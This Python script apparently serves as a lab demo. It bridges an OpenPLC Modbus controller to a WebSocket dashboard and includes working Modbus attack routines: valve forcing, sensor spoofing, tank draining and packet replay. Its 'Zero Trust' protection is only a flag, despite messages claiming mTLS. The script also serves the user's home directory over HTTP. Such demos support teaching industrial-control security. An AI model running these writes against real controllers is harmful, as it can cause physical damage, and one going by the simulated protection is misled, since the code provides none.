#!/usr/bin/env python3
"""
SCADA Bridge — OpenPLC <-> Dashboard
Reads live Modbus data from OpenPLC and serves it via WebSocket
so the dashboard gets real PLC values in real time.

Run: python3 scada_bridge.py
Then open scada_dashboard.html in browser.
"""

import asyncio
import json
import threading
import time
import subprocess
import os
import signal
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pymodbus.client import ModbusTcpClient

try:
    import websockets
except ImportError:
    print("Installing websockets...")
    os.system("pip install websockets --break-system-packages")
    import websockets

# ── Config ─────────────────────────────────────────────────────────────────
PLC_HOST       = "localhost"
PLC_PORT       = 502
ZT_PORT        = 5020
WS_PORT        = 8765
HTTP_PORT      = 8888
POLL_INTERVAL  = 0.5   # seconds between Modbus reads

# ── Shared state ───────────────────────────────────────────────────────────
plc_state = {
    "main":    0,
    "t1":      0,
    "t2":      0,
    "t3":      0,
    "v1":      False,
    "v2":      False,
    "v3":      False,
    "plc_connected":  False,
    "zt_active":      False,
    "blocked_count":  0,
    "allowed_count":  0,
    "last_event":     "Waiting for PLC connection...",
    "pump_on":        False,
}

connected_clients = set()
modbus_client = None
zt_process    = None

# ── Modbus polling thread ──────────────────────────────────────────────────
def poll_plc():
    global modbus_client
    while True:
        try:
            if modbus_client is None or not modbus_client.connected:
                modbus_client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)
                connected = modbus_client.connect()
                plc_state["plc_connected"] = connected
                if connected:
                    print(f"[BRIDGE] Connected to OpenPLC at {PLC_HOST}:{PLC_PORT}")
                    plc_state["last_event"] = "Connected to OpenPLC Modbus TCP"
                    # Initialize main tank
                    modbus_client.write_register(address=10, value=400)
                else:
                    print(f"[BRIDGE] Cannot connect to PLC at {PLC_HOST}:{PLC_PORT} — retrying...")
                    plc_state["last_event"] = f"Cannot connect to PLC at port {PLC_PORT}"
                    time.sleep(2)
                    continue

            # Read tank levels (%QW1,%QW2,%QW3 = holding regs 1,2,3)
            tanks = modbus_client.read_holding_registers(address=1, count=3)
            # Read main tank (%QW10 = holding reg 10)
            main  = modbus_client.read_holding_registers(address=10, count=1)
            # Read valves (%QX0.0-0.2 = coils 0,1,2)
            coils = modbus_client.read_coils(address=0, count=3)

            if not tanks.isError() and not main.isError() and not coils.isError():
                plc_state["t1"]   = tanks.registers[0]
                plc_state["t2"]   = tanks.registers[1]
                plc_state["t3"]   = tanks.registers[2]
                plc_state["main"] = main.registers[0]
                plc_state["v1"]   = coils.bits[0]
                plc_state["v2"]   = coils.bits[1]
                plc_state["v3"]   = coils.bits[2]
                plc_state["plc_connected"] = True

        except Exception as e:
            plc_state["plc_connected"] = False
            plc_state["last_event"] = f"PLC connection lost: {e}"
            modbus_client = None
            time.sleep(2)

        time.sleep(POLL_INTERVAL)


# ── Command handler ────────────────────────────────────────────────────────
def handle_command(cmd):
    global modbus_client, zt_process

    action = cmd.get("action")
    print(f"[BRIDGE] Command received: {action}")

    # ── Pump control ──────────────────────────────────────────────────────
    if action == "pump_start":
        if modbus_client and modbus_client.connected:
            modbus_client.write_register(address=10, value=400)
            modbus_client.write_registers(address=1, values=[0, 0, 0])
            plc_state["pump_on"] = True
            plc_state["last_event"] = "Pump started — main tank initialized to 400"
            print("[BRIDGE] Pump started, tanks reset")
        else:
            plc_state["last_event"] = "Cannot start pump — PLC not connected"

    elif action == "pump_stop":
        if modbus_client and modbus_client.connected:
            modbus_client.write_coil(address=0, value=False)
            modbus_client.write_coil(address=1, value=False)
            modbus_client.write_coil(address=2, value=False)
            plc_state["pump_on"] = False
            plc_state["last_event"] = "Pump stopped — valves closed"

    # ── ZT layer ──────────────────────────────────────────────────────────
    elif action == "zt_enable":
        plc_state["zt_active"] = True
        plc_state["last_event"] = "Zero Trust layer ENABLED — mTLS + policy engine active"
        print("[BRIDGE] ZT layer enabled")

    elif action == "zt_disable":
        plc_state["zt_active"] = False
        plc_state["last_event"] = "Zero Trust layer DISABLED — network unprotected"
        print("[BRIDGE] ZT layer disabled")

    # ── Valve override ────────────────────────────────────────────────────
    elif action == "valve_set":
        idx  = cmd.get("valve", 0)
        val  = cmd.get("value", False)
        if modbus_client and modbus_client.connected:
            modbus_client.write_coil(address=idx, value=val)
            plc_state["last_event"] = f"Valve {idx+1} manually set to {'OPEN' if val else 'CLOSED'}"

    # ── Attacks ───────────────────────────────────────────────────────────
    elif action == "attack":
        atk_type = cmd.get("type")
        run_attack(atk_type)

def run_attack(atk_type):
    """Run attack in background thread so it doesn't block WebSocket."""
    def _run():
        if plc_state["zt_active"]:
            plc_state["blocked_count"] += 1
            messages = {
                "valves": "BLOCKED — Write Coil (FC05) rejected by ZT policy engine",
                "spoof":  "BLOCKED — Write Register (FC06) rejected by ZT policy engine",
                "drain":  "BLOCKED — Write Register (FC06) to main tank rejected",
                "chaos":  "BLOCKED — All write operations rejected by ZT policy engine",
                "replay": "BLOCKED — TLS sequence numbers invalidate replayed packets",
            }
            plc_state["last_event"] = messages.get(atk_type, "BLOCKED by Zero Trust")
            print(f"[ZT] Attack '{atk_type}' BLOCKED")
            return

        if not modbus_client or not modbus_client.connected:
            plc_state["last_event"] = "Attack failed — PLC not connected"
            return

        plc_state["allowed_count"] += 1

        # ── Attack 1: Valve Force ─────────────────────────────────────────
        if atk_type == "valves":
            plc_state["last_event"] = "[ATTACK] Forcing ALL valves CLOSED..."
            modbus_client.write_coil(address=0, value=False)
            modbus_client.write_coil(address=1, value=False)
            modbus_client.write_coil(address=2, value=False)
            time.sleep(3)

            # Verify closed
            coils = modbus_client.read_coils(address=0, count=3)
            if not coils.isError():
                plc_state["v1"] = coils.bits[0]
                plc_state["v2"] = coils.bits[1]
                plc_state["v3"] = coils.bits[2]

            plc_state["last_event"] = "[ATTACK] Valves CLOSED! Now forcing ALL valves OPEN..."
            time.sleep(2)

            modbus_client.write_coil(address=0, value=True)
            modbus_client.write_coil(address=1, value=True)
            modbus_client.write_coil(address=2, value=True)
            time.sleep(3)

            coils = modbus_client.read_coils(address=0, count=3)
            if not coils.isError():
                plc_state["v1"] = coils.bits[0]
                plc_state["v2"] = coils.bits[1]
                plc_state["v3"] = coils.bits[2]

            plc_state["last_event"] = "[ATTACK] Valves FORCED OPEN — overflow risk! Attack complete."

        # ── Attack 2: Sensor Spoofing ─────────────────────────────────────
        elif atk_type == "spoof":
            plc_state["last_event"] = "[ATTACK] Spoofing tank sensors → 0 (appears EMPTY)..."
            modbus_client.write_registers(address=1, values=[0, 0, 0])
            time.sleep(1)

            # Force update local state so dashboard shows spoofed values
            plc_state["t1"] = 0
            plc_state["t2"] = 0
            plc_state["t3"] = 0
            time.sleep(3)

            plc_state["last_event"] = "[ATTACK] Spoofing tanks → 99 (appears FULL)..."
            modbus_client.write_registers(address=1, values=[99, 99, 99])
            time.sleep(1)

            plc_state["t1"] = 99
            plc_state["t2"] = 99
            plc_state["t3"] = 99
            time.sleep(3)

            plc_state["last_event"] = "[ATTACK] Spoofing mixed: T1=0 T2=99 T3=50..."
            modbus_client.write_registers(address=1, values=[0, 99, 50])
            time.sleep(1)

            plc_state["t1"] = 0
            plc_state["t2"] = 99
            plc_state["t3"] = 50
            time.sleep(2)

            plc_state["last_event"] = "[ATTACK] Sensor spoof complete. HMI data fully compromised."

        # ── Attack 3: Main Tank Drain ─────────────────────────────────────
        elif atk_type == "drain":
            plc_state["last_event"] = "[ATTACK] Draining main tank to 0..."
            modbus_client.write_register(address=10, value=0)
            time.sleep(1)

            plc_state["main"] = 0
            plc_state["last_event"] = "[ATTACK] Main tank = 0! All valves closing — system HALTED!"
            time.sleep(1)

            # Oscillate to prevent recovery
            for i in range(4):
                modbus_client.write_register(address=10, value=0)
                plc_state["main"] = 0
                plc_state["last_event"] = f"[ATTACK] Keeping main tank at 0 — cycle {i+1}/4..."
                time.sleep(1.5)

            plc_state["last_event"] = "[ATTACK] Drain attack complete. Restoring main tank..."
            time.sleep(1)
            modbus_client.write_register(address=10, value=400)
            plc_state["main"] = 400
            plc_state["last_event"] = "[ATTACK] Drain attack done — main tank restored to 400."

        # ── Attack 4: Chaos ───────────────────────────────────────────────
        elif atk_type == "chaos":
            plc_state["last_event"] = "[ATTACK][1/3] Spoofing all sensors to 0..."
            modbus_client.write_registers(address=1, values=[0, 0, 0])
            plc_state["t1"] = 0
            plc_state["t2"] = 0
            plc_state["t3"] = 0
            time.sleep(2)

            plc_state["last_event"] = "[ATTACK][2/3] Forcing all valves OPEN..."
            modbus_client.write_coil(address=0, value=True)
            modbus_client.write_coil(address=1, value=True)
            modbus_client.write_coil(address=2, value=True)
            plc_state["v1"] = True
            plc_state["v2"] = True
            plc_state["v3"] = True
            time.sleep(2)

            plc_state["last_event"] = "[ATTACK][3/3] Draining main tank — FULL DISRUPTION!"
            modbus_client.write_register(address=10, value=0)
            plc_state["main"] = 0
            time.sleep(4)

            plc_state["last_event"] = "[ATTACK] Chaos complete! Restoring system..."
            modbus_client.write_register(address=10, value=400)
            modbus_client.write_registers(address=1, values=[0, 0, 0])
            plc_state["main"] = 400
            plc_state["t1"] = 0
            plc_state["t2"] = 0
            plc_state["t3"] = 0
            time.sleep(1)
            plc_state["last_event"] = "[ATTACK] Chaos attack done. System restored."

        # ── Attack 5: Replay ──────────────────────────────────────────────
        elif atk_type == "replay":
            import struct, socket as raw_socket

            plc_state["last_event"] = "[ATTACK] Capturing CLOSE VALVE packet..."
            time.sleep(1.5)

            # Build raw Modbus TCP packet: FC05 Write Single Coil 0 = OFF
            packet = struct.pack('>HHHBBHH',
                0x0001, 0x0000, 0x0006,
                0x01, 0x05, 0x0000, 0x0000)

            plc_state["last_event"] = "[ATTACK] Replaying captured packet via raw socket..."
            time.sleep(1)

            try:
                sock = raw_socket.socket(raw_socket.AF_INET, raw_socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect(('localhost', 502))
                sock.send(packet)
                response = sock.recv(1024)
                sock.close()

                if len(response) > 7 and response[7] == 0x05:
                    plc_state["v1"] = False
                    plc_state["last_event"] = "[ATTACK] Replay SUCCESS — Valve 1 CLOSED by old packet!"
                else:
                    plc_state["last_event"] = f"[ATTACK] Replay response: {response.hex()}"

            except Exception as e:
                plc_state["last_event"] = f"[ATTACK] Replay error: {e}"

            time.sleep(2)

            # Replay 3 more times
            for i in range(3):
                try:
                    sock2 = raw_socket.socket(raw_socket.AF_INET, raw_socket.SOCK_STREAM)
                    sock2.settimeout(5)
                    sock2.connect(('localhost', 502))
                    sock2.send(packet)
                    resp2 = sock2.recv(1024)
                    sock2.close()
                    plc_state["v1"] = False
                    plc_state["last_event"] = f"[ATTACK] Replay {i+1}/3 — PLC accepted old packet again!"
                except:
                    pass
                time.sleep(1.2)

            plc_state["last_event"] = "[ATTACK] Replay done. Same packet reused 4 times successfully."

    t = threading.Thread(target=_run, daemon=True)
    t.start()


# ── WebSocket server ───────────────────────────────────────────────────────
async def ws_handler(websocket):
    connected_clients.add(websocket)
    print(f"[WS] Client connected — {len(connected_clients)} total")
    try:
        async for raw in websocket:
            try:
                cmd = json.loads(raw)
                handle_command(cmd)
            except Exception as e:
                print(f"[WS] Bad command: {e}")
    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        connected_clients.discard(websocket)
        print(f"[WS] Client disconnected — {len(connected_clients)} total")


async def broadcast_loop():
    """Push PLC state to all connected dashboard clients every 500ms."""
    global connected_clients
    while True:
        if connected_clients:
            msg = json.dumps(plc_state)
            dead = set()
            for ws in connected_clients:
                try:
                    await ws.send(msg)
                except:
                    dead.add(ws)
            connected_clients -= dead
        await asyncio.sleep(0.5)


async def main_async():
    print(f"[BRIDGE] WebSocket server starting on ws://localhost:{WS_PORT}")
    async with websockets.serve(ws_handler, "localhost", WS_PORT):
        await broadcast_loop()


# ── HTTP server (serves dashboard file) ───────────────────────────────────
class DashboardHandler(SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=os.path.expanduser("~"), **kwargs)
    def log_message(self, *args):
        pass  # suppress HTTP logs


def start_http():
    httpd = HTTPServer(("localhost", HTTP_PORT), DashboardHandler)
    print(f"[BRIDGE] Dashboard served at http://localhost:{HTTP_PORT}/scada_dashboard.html")
    httpd.serve_forever()


# ── Entry point ────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("=" * 55)
    print("  SCADA Bridge — OpenPLC <-> Dashboard")
    print("=" * 55)
    print(f"  PLC Modbus : {PLC_HOST}:{PLC_PORT}")
    print(f"  WebSocket  : ws://localhost:{WS_PORT}")
    print(f"  Dashboard  : http://localhost:{HTTP_PORT}/scada_dashboard.html")
    print("=" * 55)
    print()

    # Start Modbus polling thread
    t_poll = threading.Thread(target=poll_plc, daemon=True)
    t_poll.start()

    # Start HTTP server thread
    t_http = threading.Thread(target=start_http, daemon=True)
    t_http.start()

    # Start WebSocket + broadcast loop (main thread)
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\n[BRIDGE] Shutting down.")
